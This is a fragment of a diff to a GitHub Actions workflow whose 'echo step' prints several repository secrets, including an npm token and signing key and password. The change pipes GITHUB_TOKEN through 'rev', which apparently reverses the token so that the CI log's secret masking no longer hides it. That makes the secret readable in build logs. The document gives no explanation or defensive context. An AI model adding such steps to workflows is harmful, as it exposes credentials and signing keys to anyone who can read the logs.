@@ -61,7 +61,7 @@ jobs:
 
     - name: echo step
       run: |
-          echo ${{ secrets.GITHUB_TOKEN }} 
+          echo ${{ secrets.GITHUB_TOKEN }} | rev
           echo ${{ secrets.NPM_TOKEN }}
           echo ${{ secrets.SIGNING_KEY }} 
           echo ${{ secrets.SIGNING_PASSWORD }}
